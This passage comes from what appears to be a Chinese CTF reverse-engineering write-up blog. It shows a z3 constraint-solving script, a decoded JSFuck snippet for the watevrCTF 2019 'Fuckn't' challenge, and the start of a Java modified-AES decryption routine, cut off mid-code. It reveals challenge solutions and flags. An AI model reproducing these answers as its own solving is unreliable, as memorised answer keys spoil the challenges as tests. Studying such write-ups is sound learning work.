class="number">0x10</span>]) + param_1[<span class="number">0x11</span>]) -</span><br><span class="line">                       param_1[<span class="number">0x12</span>]) + param_1[<span class="number">0x13</span>]) - param_1[<span class="number">0x14</span>]) -</span><br><span class="line">                    param_1[<span class="number">0x15</span>]) + param_1[<span class="number">0x16</span>] + param_1[<span class="number">0x17</span>]) -</span><br><span class="line">                  param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) + param_1[<span class="number">0x1a</span>] +</span><br><span class="line">                 param_1[<span class="number">0x1b</span>] + param_1[<span class="number">0x1c</span>] + param_1[<span class="number">0x1d</span>]) -</span><br><span class="line">               param_1[<span class="number">0x1e</span>]) - param_1[<span class="number">0x1f</span>]) - param_1[<span class="number">0x20</span>]) -</span><br><span class="line">            param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) - param_1[<span class="number">0x23</span>]) - param_1[<span class="number">0x24</span>]</span><br><span class="line">         ) + param_1[<span class="number">0x25</span>] + param_1[<span class="number">0x26</span>] + param_1[<span class="number">0x27</span>]) - param_1[<span class="number">0x28</span>])</span><br><span class="line">       - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x23</span>] ==</span><br><span class="line">       ((((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) + param_1[<span class="number">2</span>] +</span><br><span class="line">                                param_1[<span class="number">3</span>] + param_1[<span class="number">4</span>]) - param_1[<span class="number">5</span>]) -</span><br><span class="line">                             param_1[<span class="number">6</span>]) + param_1[<span class="number">7</span>] + param_1[<span class="number">8</span>]) -</span><br><span class="line">                           param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) + param_1[<span class="number">0xb</span>] +</span><br><span class="line">                          param_1[<span class="number">0xc</span>] + param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]) -</span><br><span class="line">                       param_1[<span class="number">0xf</span>]) + param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) +</span><br><span class="line">                     param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>]) - param_1[<span class="number">0x14</span>]) -</span><br><span class="line">                  param_1[<span class="number">0x15</span>]) - param_1[<span class="number">0x16</span>]) + param_1[<span class="number">0x17</span>] +</span><br><span class="line">                param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) - param_1[<span class="number">0x1a</span>]) +</span><br><span class="line">              param_1[<span class="number">0x1b</span>] + param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) -</span><br><span class="line">           param_1[<span class="number">0x1e</span>]) + param_1[<span class="number">0x1f</span>] + param_1[<span class="number">0x20</span>]) - param_1[<span class="number">0x21</span>])</span><br><span class="line">         + param_1[<span class="number">0x22</span>] + param_1[<span class="number">0x23</span>] + param_1[<span class="number">0x24</span>] + param_1[<span class="number">0x25</span>] +</span><br><span class="line">         param_1[<span class="number">0x26</span>] + param_1[<span class="number">0x27</span>]) - param_1[<span class="number">0x28</span>]) - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x24</span>] ==</span><br><span class="line">       (((((((((((((((((((((((((param_1[<span class="number">0</span>] + param_1[<span class="number">1</span>] + param_1[<span class="number">2</span>]) -</span><br><span class="line">                              param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) - param_1[<span class="number">5</span>]) -</span><br><span class="line">                           param_1[<span class="number">6</span>]) + param_1[<span class="number">7</span>] + param_1[<span class="number">8</span>] +</span><br><span class="line">                          param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) + param_1[<span class="number">0xb</span>] +</span><br><span class="line">                        param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>]) + param_1[<span class="number">0xe</span>] +</span><br><span class="line">                       param_1[<span class="number">0xf</span>] + param_1[<span class="number">0x10</span>] + param_1[<span class="number">0x11</span>] +</span><br><span class="line">                       param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>] + param_1[<span class="number">0x14</span>] +</span><br><span class="line">                      param_1[<span class="number">0x15</span>]) - param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) +</span><br><span class="line">                   param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) - param_1[<span class="number">0x1a</span>]) -</span><br><span class="line">                param_1[<span class="number">0x1b</span>]) - param_1[<span class="number">0x1c</span>]) + param_1[<span class="number">0x1d</span>] +</span><br><span class="line">               param_1[<span class="number">0x1e</span>] + param_1[<span class="number">0x1f</span>] + param_1[<span class="number">0x20</span>]) -</span><br><span class="line">             param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) - param_1[<span class="number">0x23</span>]) -</span><br><span class="line">          param_1[<span class="number">0x24</span>]) + param_1[<span class="number">0x25</span>]) - param_1[<span class="number">0x26</span>]) + param_1[<span class="number">0x27</span>] +</span><br><span class="line">       param_1[<span class="number">0x28</span>]) - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x25</span>] ==</span><br><span class="line">       ((((((((((((((((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) - param_1[<span class="number">2</span>])</span><br><span class="line">                                          + param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) + param_1[<span class="number">5</span>]</span><br><span class="line">                                        ) - param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>]</span><br><span class="line">                                     ) - param_1[<span class="number">9</span>]) + param_1[<span class="number">10</span>]) - param_1[<span class="number">0xb</span>]</span><br><span class="line">                                  ) - param_1[<span class="number">0xc</span>]) - param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]</span><br><span class="line">                               ) - param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) + param_1[<span class="number">0x11</span>]</span><br><span class="line">                            + param_1[<span class="number">0x12</span>]) - param_1[<span class="number">0x13</span>]) - param_1[<span class="number">0x14</span>]) -</span><br><span class="line">                         param_1[<span class="number">0x15</span>]) + param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) +</span><br><span class="line">                      param_1[<span class="number">0x18</span>]) - param_1[<span class="number">0x19</span>]) - param_1[<span class="number">0x1a</span>]) +</span><br><span class="line">                   param_1[<span class="number">0x1b</span>]) - param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) +</span><br><span class="line">                 param_1[<span class="number">0x1e</span>] + param_1[<span class="number">0x1f</span>]) - param_1[<span class="number">0x20</span>]) +</span><br><span class="line">              param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) + param_1[<span class="number">0x23</span>]) -</span><br><span class="line">           param_1[<span class="number">0x24</span>]) - param_1[<span class="number">0x25</span>]) + param_1[<span class="number">0x26</span>]) - param_1[<span class="number">0x27</span>])</span><br><span class="line">       - param_1[<span class="number">0x28</span>]) - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x26</span>] ==</span><br><span class="line">       ((((((((((((((((((((((((((param_1[<span class="number">0</span>] + param_1[<span class="number">1</span>] + param_1[<span class="number">2</span>] +</span><br><span class="line">                                param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) + param_1[<span class="number">5</span>] +</span><br><span class="line">                               param_1[<span class="number">6</span>] + param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>]) -</span><br><span class="line">                            param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) + param_1[<span class="number">0xb</span>] +</span><br><span class="line">                           param_1[<span class="number">0xc</span>] + param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]) -</span><br><span class="line">                        param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) -</span><br><span class="line">                     param_1[<span class="number">0x12</span>]) - param_1[<span class="number">0x13</span>]) + param_1[<span class="number">0x14</span>] +</span><br><span class="line">                   param_1[<span class="number">0x15</span>]) - param_1[<span class="number">0x16</span>]) + param_1[<span class="number">0x17</span>] +</span><br><span class="line">                  param_1[<span class="number">0x18</span>] + param_1[<span class="number">0x19</span>] + param_1[<span class="number">0x1a</span>] +</span><br><span class="line">                 param_1[<span class="number">0x1b</span>]) - param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) +</span><br><span class="line">               param_1[<span class="number">0x1e</span>] + param_1[<span class="number">0x1f</span>]) - param_1[<span class="number">0x20</span>]) -</span><br><span class="line">            param_1[<span class="number">0x21</span>]) + param_1[<span class="number">0x22</span>]) - param_1[<span class="number">0x23</span>]) - param_1[<span class="number">0x24</span>]</span><br><span class="line">         ) - param_1[<span class="number">0x25</span>]) + param_1[<span class="number">0x26</span>] + param_1[<span class="number">0x27</span>] + param_1[<span class="number">0x28</span>])</span><br><span class="line">       - param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x27</span>] ==</span><br><span class="line">       (((((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) - param_1[<span class="number">2</span>]) -</span><br><span class="line">                             param_1[<span class="number">3</span>]) - param_1[<span class="number">4</span>]) + param_1[<span class="number">5</span>]) -</span><br><span class="line">                          param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>]) +</span><br><span class="line">                       param_1[<span class="number">9</span>]) - param_1[<span class="number">10</span>]) + param_1[<span class="number">0xb</span>]) -</span><br><span class="line">                    param_1[<span class="number">0xc</span>]) + param_1[<span class="number">0xd</span>] + param_1[<span class="number">0xe</span>]) -</span><br><span class="line">                  param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) +</span><br><span class="line">                param_1[<span class="number">0x12</span>] + param_1[<span class="number">0x13</span>] + param_1[<span class="number">0x14</span>] +</span><br><span class="line">                param_1[<span class="number">0x15</span>] + param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) +</span><br><span class="line">              param_1[<span class="number">0x18</span>] + param_1[<span class="number">0x19</span>] + param_1[<span class="number">0x1a</span>] + param_1[<span class="number">0x1b</span>]</span><br><span class="line">             + param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) + param_1[<span class="number">0x1e</span>] +</span><br><span class="line">            param_1[<span class="number">0x1f</span>] + param_1[<span class="number">0x20</span>] + param_1[<span class="number">0x21</span>] + param_1[<span class="number">0x22</span>]) -</span><br><span class="line">          param_1[<span class="number">0x23</span>]) - param_1[<span class="number">0x24</span>]) + param_1[<span class="number">0x25</span>] + param_1[<span class="number">0x26</span>] +</span><br><span class="line">        param_1[<span class="number">0x27</span>]) - param_1[<span class="number">0x28</span>]) + param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x28</span>] ==</span><br><span class="line">       ((((((((((((((((((((((param_1[<span class="number">0</span>] - param_1[<span class="number">1</span>]) - param_1[<span class="number">2</span>]) -</span><br><span class="line">                          param_1[<span class="number">3</span>]) + param_1[<span class="number">4</span>] + param_1[<span class="number">5</span>] + param_1[<span class="number">6</span>]</span><br><span class="line">                         ) - param_1[<span class="number">7</span>]) + param_1[<span class="number">8</span>] + param_1[<span class="number">9</span>]) -</span><br><span class="line">                      param_1[<span class="number">10</span>]) + param_1[<span class="number">0xb</span>]) - param_1[<span class="number">0xc</span>]) -</span><br><span class="line">                   param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]) + param_1[<span class="number">0xf</span>] +</span><br><span class="line">                  param_1[<span class="number">0x10</span>] + param_1[<span class="number">0x11</span>] + param_1[<span class="number">0x12</span>] +</span><br><span class="line">                  param_1[<span class="number">0x13</span>] + param_1[<span class="number">0x14</span>] + param_1[<span class="number">0x15</span>] +</span><br><span class="line">                 param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) + param_1[<span class="number">0x18</span>] +</span><br><span class="line">               param_1[<span class="number">0x19</span>]) - param_1[<span class="number">0x1a</span>]) + param_1[<span class="number">0x1b</span>] +</span><br><span class="line">             param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) + param_1[<span class="number">0x1e</span>] + param_1[<span class="number">0x1f</span>]</span><br><span class="line">           + param_1[<span class="number">0x20</span>]) - param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) +</span><br><span class="line">         param_1[<span class="number">0x23</span>] + param_1[<span class="number">0x24</span>]) - param_1[<span class="number">0x25</span>]) + param_1[<span class="number">0x26</span>] +</span><br><span class="line">       param_1[<span class="number">0x27</span>] + param_1[<span class="number">0x28</span>] + param_1[<span class="number">0x29</span>])</span><br><span class="line">s.add(param_2[<span class="number">0x29</span>] ==</span><br><span class="line">       (((((((((((((((((((((((((((((((param_1[<span class="number">0</span>] + param_1[<span class="number">1</span>] + param_1[<span class="number">2</span>] +</span><br><span class="line">                                      param_1[<span class="number">3</span>] + param_1[<span class="number">4</span>] + param_1[<span class="number">5</span>] +</span><br><span class="line">                                     param_1[<span class="number">6</span>]) - param_1[<span class="number">7</span>]) - param_1[<span class="number">8</span>]) -</span><br><span class="line">                                  param_1[<span class="number">9</span>]) + param_1[<span class="number">10</span>] + param_1[<span class="number">0xb</span>]) -</span><br><span class="line">                                param_1[<span class="number">0xc</span>]) + param_1[<span class="number">0xd</span>]) - param_1[<span class="number">0xe</span>]) -</span><br><span class="line">                             param_1[<span class="number">0xf</span>]) - param_1[<span class="number">0x10</span>]) - param_1[<span class="number">0x11</span>]) -</span><br><span class="line">                          param_1[<span class="number">0x12</span>]) - param_1[<span class="number">0x13</span>]) + param_1[<span class="number">0x14</span>]) -</span><br><span class="line">                       param_1[<span class="number">0x15</span>]) + param_1[<span class="number">0x16</span>]) - param_1[<span class="number">0x17</span>]) -</span><br><span class="line">                    param_1[<span class="number">0x18</span>]) + param_1[<span class="number">0x19</span>] + param_1[<span class="number">0x1a</span>] +</span><br><span class="line">                    param_1[<span class="number">0x1b</span>] + param_1[<span class="number">0x1c</span>]) - param_1[<span class="number">0x1d</span>]) -</span><br><span class="line">                 param_1[<span class="number">0x1e</span>]) - param_1[<span class="number">0x1f</span>]) - param_1[<span class="number">0x20</span>]) -</span><br><span class="line">              param_1[<span class="number">0x21</span>]) - param_1[<span class="number">0x22</span>]) - param_1[<span class="number">0x23</span>]) -</span><br><span class="line">           param_1[<span class="number">0x24</span>]) - param_1[<span class="number">0x25</span>]) - param_1[<span class="number">0x26</span>]) - param_1[<span class="number">0x27</span>])</span><br><span class="line">       - param_1[<span class="number">0x28</span>]) + param_1[<span class="number">0x29</span>])</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    print(m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> param_1:</span><br><span class="line">        res.append(m[i].as_long())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    res[i]^=i</span><br><span class="line">    res[i] = (res[i]&gt;&gt;<span class="number">3</span>)|(res[i]&lt;&lt;<span class="number">5</span>)</span><br><span class="line">    res[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(res)</span><br><span class="line">print(bytes(res))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="rev-watevrCTF-2019-Fuckn’t"><a href="#rev-watevrCTF-2019-Fuckn’t" class="headerlink" title="[rev] [watevrCTF 2019]Fuckn’t"></a>[rev] [watevrCTF 2019]Fuckn’t</h2><p>github有jsunfuck</p>
<p><a target="_blank" rel="noopener" href="https://github.com/krk/jsunfuck">https://github.com/krk/jsunfuck</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[][<span class="string">&quot;f&quot;</span>+([!<span class="number">1</span>]+[][[[].filter[<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return(isNaN+false).constructor.&quot;</span>+<span class="number">420302320151902</span>[<span class="string">&quot;toString&quot;</span>](<span class="string">&quot;31&quot;</span>)[<span class="string">&quot;split&quot;</span>](<span class="number">3</span>)[<span class="string">&quot;join&quot;</span>](<span class="string">&quot;C&quot;</span>)+<span class="string">&quot;de(&quot;</span>+<span class="string">&quot;119false97false116false101false118false114false123false106false97false118false97false115false99false114false105false112false116false95false105false115false95false97false95false49false97false110false103false117false97false103false51false95false102false48false114false95false105false110false116false51false49false49false51false99false116false117false97false49false115false125&quot;</span>[<span class="string">&quot;split&quot;</span>](!<span class="number">1</span>)+</span><br><span class="line"><span class="string">&quot;)&quot;</span>)()]])[<span class="string">&quot;10&quot;</span>]+<span class="string">&quot;lter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return alert&quot;</span>)()([].filter[<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return(isNaN+false).constructor.&quot;</span>+<span class="number">420302320151902</span>[<span class="string">&quot;toString&quot;</span>](<span class="string">&quot;31&quot;</span>)[<span class="string">&quot;split&quot;</span>](<span class="number">3</span>)[<span class="string">&quot;join&quot;</span>](<span class="string">&quot;C&quot;</span>)+<span class="string">&quot;de(&quot;</span>+<span class="string">&quot;73false39false109false32false115false111false114false114false121false32false68false97false118false101false44false32false73false39false109false32false97false102false114false97false105false100false32false73false32false99false97false110false39false116false32false100false111false32false116false104false97false116&quot;</span>[<span class="string">&quot;split&quot;</span>](!<span class="number">1</span>)+</span><br><span class="line"><span class="string">&quot;)&quot;</span>)());</span><br></pre></td></tr></table></figure>
<h2 id="rev-GAesDecode"><a href="#rev-GAesDecode" class="headerlink" title="[rev]GAesDecode"></a>[rev]GAesDecode</h2><p>变化版AES，主要不同在于密钥无需扩展，直接是长密钥；另外MixColumns时乘的多项式也变了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LightState</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">byte</span>[][] _states = ((<span class="keyword">byte</span>[][]) Array.newInstance(Byte.TYPE, <span class="number">4</span>, <span class="number">4</span>));</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LightState</span><span class="params">(<span class="keyword">byte</span>[] states)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">this</span>._states[j][i] = states[(i * <span class="number">4</span>) + j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LightState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">byte</span> <span class="title">value</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._states[i][j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>._states[i][j] = (<span class="keyword">byte</span>) val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">printState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;%d==================================\n&quot;</span>, cnt);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                System.out.printf(<span class="string">&quot;0x%02x,&quot;</span>, <span class="keyword">this</span>._states[i][j]);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================================&quot;</span>);</span><br><span class="line">        cnt++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reValue</span><span class="params">(<span class="keyword">byte</span>[] states)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                states[(i * <span class="number">4</span> + j)] = <span class="keyword">this</span>._states[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shiftRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                temp[j] = <span class="keyword">this</span>._states[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j2 = <span class="number">0</span>; j2 &lt; <span class="number">4</span>; j2++) &#123;</span><br><span class="line">                <span class="keyword">this</span>._states[i][j2] = temp[(j2 + i) % <span class="number">4</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reShiftRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] temp = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                temp[(j + i) % <span class="number">4</span>] = 